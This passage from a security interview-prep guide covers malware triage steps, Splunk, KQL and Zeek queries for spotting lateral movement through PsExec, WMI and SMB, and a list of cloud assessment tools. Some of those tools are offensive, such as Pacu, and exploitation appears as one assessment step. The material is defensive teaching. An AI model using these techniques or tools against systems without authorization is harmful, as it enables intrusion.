1. Basic Info
   file suspicious.exe
   strings suspicious.exe | grep -i "http\|password\|cmd"

2. PE Analysis
   pestudio suspicious.exe
   pefile analysis (Python)

3. YARA Matching
   yara -r malware_rules/ suspicious.exe

4. Hash Lookup
   sha256sum suspicious.exe
   vt file <hash>

DYNAMIC ANALYSIS:
1. Sandbox
   Any.Run / Joe Sandbox / Hybrid Analysis

2. Network
   Wireshark / Fiddler capture

3. Process
   ProcMon / Process Explorer

4. System Changes
   Regshot (before/after)

MEMORY ANALYSIS (if running):
vol -f memory.raw windows.malfind
vol -f memory.raw windows.vadinfo --pid PID
vol -f memory.raw windows.handles --pid PID
```

### Q4: Explain how you would hunt for lateral movement.

```
INDICATORS:
├─ Logon events from unusual sources (4624 Type 3/10)
├─ PsExec/WMI/WinRM usage
├─ SMB connections to multiple hosts
├─ Pass-the-hash/ticket indicators
└─ Service installations (7045)

SPLUNK:
# Remote logons from workstations
index=windows EventCode=4624 LogonType=3
| stats dc(ComputerName) as targets by IpAddress, TargetUserName
| where targets > 5

# PsExec indicators
index=windows (EventCode=7045 ServiceName="PSEXESVC")
    OR (EventCode=1 Image="*\\PSEXESVC.exe")

KQL:
// Multiple machine access
SecurityEvent
| where EventID == 4624 and LogonType == 3
| summarize TargetCount=dcount(Computer) by IpAddress, TargetAccount
| where TargetCount > 5

// WMI lateral movement
DeviceProcessEvents
| where InitiatingProcessFileName =~ "wmiprvse.exe"
| where FileName in~ ("cmd.exe", "powershell.exe")

ZEEK:
# SMB access to multiple hosts
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p
| awk '$3 == 445' | cut -f1 | sort | uniq -c | sort -rn | awk '$1 > 5'
```

### Q5: What tools would you use for cloud security assessment?

```
AWS:
├─ Prowler (CIS benchmarks, compliance)
├─ ScoutSuite (multi-cloud assessment)
├─ Pacu (exploitation framework)
├─ CloudSploit (misconfiguration)
├─ Steampipe (SQL-based queries)
└─ AWS CLI + custom scripts

AZURE:
├─ AzureHound (BloodHound for Azure)
├─ ROADtools (Azure AD analysis)
├─ MicroBurst (assessment framework)
├─ ScoutSuite
└─ Az CLI + PowerShell

GCP:
├─ ScoutSuite
├─ gcloud CLI
└─ Forseti Security

KUBERNETES:
├─ kube-hunter (vulnerability scanning)
├─ kube-bench (CIS benchmarks)
├─ Trivy (container scanning)
├─ Falco (runtime security)
├─ kubeaudit
└─ kubectl with custom queries

METHODOLOGY:
1. Enumerate: Discover assets, permissions, configurations
2. Assess: Check against benchmarks (CIS, Well-Architected)
3. Test: Validate findings, attempt exploitation
4. Report: Prioritize by risk and remediation effort
```

---

**Return to [00_INDEX.md](./00_INDEX.md) for navigation.**
